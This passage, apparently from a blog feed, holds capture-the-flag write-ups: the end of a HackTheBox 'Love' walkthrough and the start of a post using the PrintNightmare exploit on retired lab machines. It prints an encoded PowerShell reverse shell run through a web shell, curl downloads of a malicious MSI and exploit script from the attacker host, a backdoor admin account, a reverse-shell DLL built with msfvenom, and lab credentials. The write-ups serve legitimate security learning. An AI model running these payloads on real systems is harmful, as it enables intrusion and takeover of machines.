class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>I will setup a listener and leverage the web shell to execute my payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
</span></span><span class="line"><span class="cl">-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">65a5...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The flag also accessible using SSRF.</p>
<p><div class="img-container"><img src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Checking AlwaysInstallElevated
</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKLM!
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKCU!
</span></span></code></pre></div><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
<p>I will generate a malicious <code>.msi</code> that will add a user with administrative access using <code>msfvenom</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">270</span> bytes
</span></span><span class="line"><span class="cl">Final size of msi file: <span class="m">159744</span> bytes
</span></span><span class="line"><span class="cl">Saved as: iamf.msi
</span></span></code></pre></div><p>I will host the <code>.msi</code> using Python web server.</p>
<p>On Love, I will grab the msi and install the package immediately.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
</span></span><span class="line"><span class="cl">                                                                                                                                                                           
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------                                                                                            
</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           Guest                                                                                                                    
</span></span><span class="line"><span class="cl">iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.                                                                                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; 
</span></span></code></pre></div><h4 id="psexec---system">Psexec - SYSTEM</h4>
<p>I can login using my backdoor user with help of <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">love
</span></span></code></pre></div><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">adm1n                    Administrator            DefaultAccount           
</span></span><span class="line"><span class="cl">Guest                    iamf                     Phoebe                   
</span></span><span class="line"><span class="cl">WDAGUtilityAccount       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span></code></pre></div><p>I can login via WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">Love
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Play with PrintNightmare using HackTheBox machines</title>
      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
      <description>Having fun with a Zero-Day vulnerability</description>
      <content:encoded><![CDATA[<p>A lot of InfoSec pros I follow on Twitter have been <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I&rsquo;ll just play around with the PoC to own <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a>.</p>
<h2 id="preparation">Preparation</h2>
<p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 -m pip install virtualenv
</span></span></code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it should be configured to allow anonymous access, so that the exploit can directly grab the DLL.</p>
<h4 id="working-directory">Working Directory</h4>
<p>First thing first, is a working directory/folder, which I will create one under <code>/opt</code> called <code>printnightmare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
</span></span></code></pre></div><p>Inside the <code>printnightmare</code>, I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</span></span></code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ virtualenv impacket-venv
</span></span><span class="line"><span class="cl">created virtual environment CPython3.9.2.final.0-64 in 614ms
</span></span><span class="line"><span class="cl">  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
</span></span><span class="line"><span class="cl">  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
</span></span><span class="line"><span class="cl">    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
</span></span><span class="line"><span class="cl">  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</span></span></code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">source</span> impacket-venv/bin/activate
</span></span></code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
</span></span><span class="line"><span class="cl">running install
</span></span><span class="line"><span class="cl">running bdist_egg
</span></span><span class="line"><span class="cl">running egg_info
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="dll-payload">DLL Payload</h4>
<p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ mkdir dll
</span></span></code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connect back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">8704</span> bytes
</span></span></code></pre></div><blockquote>
<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="#troubleshoot">Troubleshoot</a></p>
</blockquote>
<h4 id="samba-server-configuration">Samba Server Configuration</h4>
<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging.</p>
<p>First, I will create a backup of the original Samba configuration file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
</span></span></code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[global]
</span></span><span class="line"><span class="cl">   server role = standalone server
</span></span><span class="line"><span class="cl">   smb ports = 445
</span></span><span class="line"><span class="cl">   map to guest = bad user
</span></span><span class="line"><span class="cl">   usershare allow guests = yes
</span></span><span class="line"><span class="cl">   idmap config * : backend = tdb
</span></span><span class="line"><span class="cl">   log file = /var/log/samba/log.%m
</span></span><span class="line"><span class="cl">   max log size = 1000
</span></span><span class="line"><span class="cl">   logging = file
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">[ef]
</span></span><span class="line"><span class="cl">    comment = Samba
</span></span><span class="line"><span class="cl">    path = /opt/printnightmare/dll
</span></span><span class="line"><span class="cl">    guest ok = yes
</span></span><span class="line"><span class="cl">    read only = no
</span></span><span class="line"><span class="cl">    browsable = yes
</span></span></code></pre></div><p>Lastly, I will start the Samba service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo systemctl start smbd 
</span></span></code></pre></div><h2 id="target-machines">Target Machines</h2>
<p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p>
<div class="table-wrapper" >
<table>
<thead>
<tr>
<th style="text-align:center">Target</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">Low Priv Credentials [username:password]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Active</td>
<td style="text-align:center">10.10.10.100</td>
<td style="text-align:center"><code>svc_tgs:GPPstillStandingStrong2k18</code></td>
</tr>
<tr>
<td style="text-align:center">Bastion</td>
<td style="text-align:center">10.10.10.134</td>
<td style="text-align:center"><code>l4mpje:bureaulampje</code></td>
</tr>
<tr>
<td style="text-align:center">Heist</td>
<td style="text-align:center">10.10.10.149</td>
<td style="text-align:center"><code>hazard:stealth1agent</code></td>
</tr>
<tr>
<td style="text-align:center">Forest</td>
<td style="text-align:center">10.10.10.161</td>
<td style="text-align:center"><code>svc-alfresco:s3rvice</code></td>
</tr>
<tr>
<td style="text-align:center">Atom</td>
<td style="text-align:center">10.10.10.237</td>
<td style="text-align:center"><code>jason:kidvscat_electron_@123</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="target-scanning">Target Scanning</h2>
<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
<ol>
<li>Print Spooler Service enabled on the target system ❔</li>
<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
<li>Hash or password for a low privileged user (or computer) account  ✔</li>
</ol>
<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span></code></pre></div><p><code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
<p>The following is a dirty bash script I created as a wrapper for checking via <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
</span></span><span class="line"><span class="cl">		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
</span></span><span class="line"><span class="cl">		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span><span class="line"><span class="cl">		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./detect-nightmare.sh target-machines
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
